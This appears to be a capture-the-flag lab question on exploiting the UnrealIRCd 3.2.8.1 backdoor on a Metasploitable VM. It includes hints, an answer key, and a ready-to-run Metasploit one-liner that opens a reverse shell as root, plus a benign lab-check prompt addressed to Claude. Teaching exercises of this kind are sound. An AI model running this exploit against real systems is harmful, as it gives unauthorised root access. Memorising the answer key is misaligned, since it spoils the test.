# Q046 — UnrealIRCd Backdoor

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Exploit the UnrealIRCd 3.2.8.1 backdoor on Metasploitable port 6667. Report the **module name** used.

---

## 🎯 Flag Format

```
module=<msf-module-path>
```

Example: `module=exploit/unix/irc/unreal_ircd_3281_backdoor`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Search msf for `unreal`.
</details>

<details>
<summary>Hint 2</summary>

Default reverse shell payload works.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.52.129; set LHOST 192.168.52.128; run'
```

Drops shell as `root` typically.

**Answer:** `module=exploit/unix/irc/unreal_ircd_3281_backdoor`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q046".
```
